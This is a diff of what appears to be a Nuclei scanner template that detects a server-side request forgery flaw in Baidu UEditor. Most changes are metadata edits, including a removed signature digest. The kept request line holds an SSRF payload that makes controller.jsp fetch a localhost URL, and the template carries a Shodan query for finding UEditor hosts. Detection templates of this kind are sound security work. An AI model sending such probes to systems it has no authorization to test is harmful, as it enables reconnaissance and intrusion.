@@ -8,15 +8,11 @@ info:
   reference:
     - https://xz.aliyun.com/t/4154
     - https://www.seebug.org/vuldb/ssvid-97311
-  classification:
-    cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 2
-    vendor: baidu
-    product: ueditor
+    verified: true
     shodan-query: html:"UEditor"
-  tags: ueditor,ssrf,vuln
+  tags: ueditor,ssrf
 
 http:
   - method: GET
@@ -25,7 +21,6 @@ http:
       - "{{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png"
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -39,4 +34,3 @@ http:
       - type: status
         status:
           - 200
-# digest: 4b0a004830460221009f1e679587bb1444df9e94239ecba0b82c67eb4df4f4317aa2db77bd9b4c3c4e0221009c187c809a19351e4d9a787dc35f5eecf10db7a93ad5846fb538ea6d9952054e:922c64590222798bb761d5b6d8e72950
